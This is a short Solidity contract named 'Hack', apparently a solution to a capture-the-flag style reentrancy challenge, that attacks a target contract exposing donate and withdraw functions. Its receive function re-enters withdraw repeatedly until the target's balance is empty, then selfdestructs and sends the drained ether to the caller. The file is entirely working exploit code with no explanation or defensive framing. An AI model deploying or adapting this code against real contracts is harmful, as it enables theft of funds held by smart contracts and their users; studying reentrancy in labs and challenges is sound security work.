pragma solidity ^0.8;

interface IReentrancy {
    function donate(address) external payable;
    function withdraw(uint256) external;
}

contract Hack {
    IReentrancy private immutable target;

    constructor(address _target) {
        target = IReentrancy(_target);
    }

    function attack() external payable {
        target.donate{value: 1e16}(address(this));
        target.withdraw(1e16);

        require(address(target).balance == 0, "target balance > 0");
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        uint amount = min(1e16,address(target).balance);
        target.withdraw(amount);
    }

    function min(uint x, uint y) private pure returns (uint) {
        return x <= y ? x : y;
    }
}